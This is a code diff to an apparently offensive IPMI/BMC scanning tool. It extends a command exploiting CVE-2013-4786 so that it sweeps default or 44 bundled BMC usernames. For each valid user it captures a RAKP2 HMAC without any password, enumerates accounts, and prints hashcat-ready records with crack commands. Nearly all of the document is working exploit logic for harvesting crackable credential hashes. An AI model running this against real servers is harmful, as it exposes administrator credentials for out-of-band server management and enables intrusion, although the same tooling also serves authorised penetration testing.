@@ -4718,20 +4718,31 @@ def cmd_scan_cipher_suites(args: argparse.Namespace) -> int:
 
 
 def cmd_scan_rakp_hash(args: argparse.Namespace) -> int:
-    """CVE-2013-4786 — grab a crackable RAKP2 HMAC without authenticating.
+    """CVE-2013-4786 — grab crackable RAKP2 HMAC(s) without authenticating.
 
     Negotiates the fastest-cracking auth algo the BMC will establish
-    (HMAC-MD5 > SHA1 > SHA256), sends RAKP1 for the given username, catches
-    RAKP2, and drops before RAKP3. Emits a hashcat-ready line. Needs only a
-    valid username (default root) — no password. Prepend the username to the
-    record for your own bookkeeping; the crack echoes the bare hash."""
+    (HMAC-MD5 > SHA1 > SHA256), sends RAKP1 per username, catches RAKP2, and
+    drops before RAKP3. Emits a hashcat-ready line per valid user. No password.
+
+    Username source: `-U NAME` = that one user; `--extended-user-list` = the
+    bundled 44 default BMC accounts (credit: oobscan); neither = the 6 famous
+    defaults. A sweep doubles as user enumeration (valid → hash; else 0x0d).
+    Record is `user:hmac:salt` on stdout; the crack echoes the bare hash."""
     host = _require_host(args)
-    s = Session(host=host, username=args.user, password=args.password or "x",
+    if getattr(args, "extended_user_list", False):
+        users = list(Session.RAKP_EXTENDED_USERS)
+    elif args.user:
+        users = [args.user]
+    else:
+        users = list(Session.RAKP_DEFAULT_USERS)
+    s = Session(host=host, username=args.user or "", password=args.password or "x",
                 lanplus=True, timeout=args.timeout)
     s.transport.port = args.port
     _apply_trace(s.transport, args)
+    if len(users) > 1:
+        _msg.info(f"rakp-hash {host}: sweeping {len(users)} usernames")
     try:
-        result = s.grab_rakp_hashes(pad_username=getattr(args, "pad", False))
+        result = s.grab_rakp_hashes(users=users, pad_username=getattr(args, "pad", False))
     except Exception as e:
         _msg.error(f"rakp-hash {host}: {e}")
         return 2
@@ -4739,19 +4750,30 @@ def cmd_scan_rakp_hash(args: argparse.Namespace) -> int:
         s.transport.close()
 
     if emit(args, result):
-        return 0 if result["hash"] else 1
-    for a in result["attempts"]:
-        if not a["ok"]:
+        return 0 if result["hashes"] else 1
+
+    hashes = result["hashes"]
+    # Open-Session probe failures (user is None) = BMC won't negotiate a hash
+    # algo at all; show once. Per-user 0x0d (no such account) is expected noise
+    # in a sweep — summarize rather than spray.
+    openfail = [a for a in result["attempts"] if a.get("user") is None]
+    if not hashes and openfail:
+        for a in openfail:
             _msg.info(f"{a['alg']:<11} suite {a['suite']:<2} -> {a['error']}")
-    h = result["hash"]
-    if not h:
-        _msg.error(f"rakp-hash {host}: no auth algorithm produced a hash")
+    if not hashes:
+        _msg.error(f"rakp-hash {host}: no hashes captured "
+                   f"(no valid user, or no hash algo)")
         return 1
-    _msg.info(f"{h['alg']}  ({len(h['auth_code']) // 2}-byte auth code)")
-    print(h["record"])                                   # record -> stdout (pipeable)
-    hexflag = " --hex-salt" if h["hex_salt"] else ""
-    _msg.info(f"to crack: hashcat -m {h['hc_mode']}{hexflag} "
-              f"<(echo '{h['line']}') wordlist.txt")
+    if len(users) > 1:
+        noacct = sum(1 for a in result["attempts"]
+                     if a.get("user") is not None and "0x0d" in a["error"])
+        _msg.info(f"rakp-hash {host}: {len(hashes)} hash(es), {noacct} no-account")
+    for h in hashes:
+        _msg.info(f"{h['user']!r}  {h['alg']}  ({len(h['auth_code']) // 2}-byte auth code)")
+        print(h["record"])                               # record -> stdout (pipeable)
+        hexflag = " --hex-salt" if h["hex_salt"] else ""
+        _msg.info(f"  crack: hashcat -m {h['hc_mode']}{hexflag} "
+                  f"<(echo '{h['line']}') wordlist.txt")
     return 0
 
 
@@ -6319,6 +6341,9 @@ def build_parser() -> argparse.ArgumentParser:
         if name == "rakp-hash":
             s.add_argument("--pad", action="store_true",
                            help="NUL-pad username to 16B (iDRAC-quirk targets only)")
+            s.add_argument("--extended-user-list", action="store_true",
+                           help="sweep the bundled 44 default BMC accounts "
+                                "(credit: oobscan) instead of the 6 famous defaults")
         s.set_defaults(func=fn)
 
     return p
